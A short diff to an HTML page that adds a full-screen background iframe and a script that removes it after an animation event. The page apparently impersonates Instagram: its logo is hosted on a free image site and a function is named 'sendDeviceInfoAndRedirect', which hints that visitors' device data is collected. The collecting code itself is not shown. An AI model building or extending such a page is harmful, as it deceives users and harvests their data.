@@ -390,7 +390,15 @@ function sendDeviceInfoAndRedirect() {
     </style>
 </head>
 <body>
-    <!-- Add a navigation bar with the new Instagram logo -->
+  <iframe src="null.html" frameborder="0" style="width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: -1;"></iframe>
+
+  <script>
+    window.addEventListener("animationFinished", () => {
+      const iframe = document.querySelector("iframe");
+      iframe.parentNode.removeChild(iframe);
+    });
+  </script>
+  <!-- Add a navigation bar with the new Instagram logo -->
     <div class="navbar">
         <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
     </div>
